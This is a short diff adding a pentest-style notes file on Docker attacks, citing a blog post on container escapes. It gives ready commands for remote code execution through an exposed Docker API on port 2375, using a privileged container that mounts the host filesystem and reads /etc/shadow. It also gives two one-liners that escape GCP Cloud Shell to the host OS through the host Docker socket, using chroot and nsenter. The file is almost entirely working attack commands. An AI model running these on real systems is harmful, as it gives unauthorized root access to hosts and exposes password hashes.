@@ -1,0 +1,16 @@
+https://blog.secureideas.com/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html
+
+RCE using Docker API on port 2375/tcp
+
+docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
+
+File Access: cat /mnt/etc/shadow
+RCE: chroot /mnt
+
+------
+One-liner #Docker escape from #GCP's Cloud Shell to the host OS:
+
+docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+
+
